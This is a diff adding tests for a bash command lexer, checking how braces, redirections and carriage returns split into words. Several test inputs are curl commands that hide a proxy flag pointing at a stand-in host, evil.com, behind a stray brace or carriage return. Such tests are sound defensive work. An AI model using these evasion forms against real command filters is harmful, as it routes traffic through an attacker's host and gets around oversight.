@@ -183,6 +183,28 @@ describe('lexCommand heredoc bodies', () => {
   });
 });
 
+describe('lexCommand braces and carriage returns (as bash reads them)', () => {
+  const words = (line: string) => lexCommand(line).commands.map((c) => c.words);
+  it('treats { and } as group delimiters only in command position', () => {
+    expect(words('curl https://ok.com } -x evil.com:80')).toEqual([
+      ['curl', 'https://ok.com', '}', '-x', 'evil.com:80'],
+    ]);
+    expect(words('curl https://ok.com { --proxy evil.com:80')).toEqual([
+      ['curl', 'https://ok.com', '{', '--proxy', 'evil.com:80'],
+    ]);
+    expect(words('{ echo a; ls; }; pwd')).toEqual([['echo', 'a'], ['ls'], ['pwd']]);
+    expect(words('true && { echo b; }')).toEqual([['true'], ['echo', 'b']]);
+  });
+  it('a { after a redirection is a word, as in bash', () => {
+    expect(words('>f { echo')).toEqual([['{', 'echo']]);
+  });
+  it('a carriage return is a word character', () => {
+    expect(words('curl -H\r -xevil.com:80 https://ok.com')).toEqual([
+      ['curl', '-H\r', '-xevil.com:80', 'https://ok.com'],
+    ]);
+  });
+});
+
 describe('partsOfCall', () => {
   it('splits a Bash call', () => {
     const parts = partsOfCall(
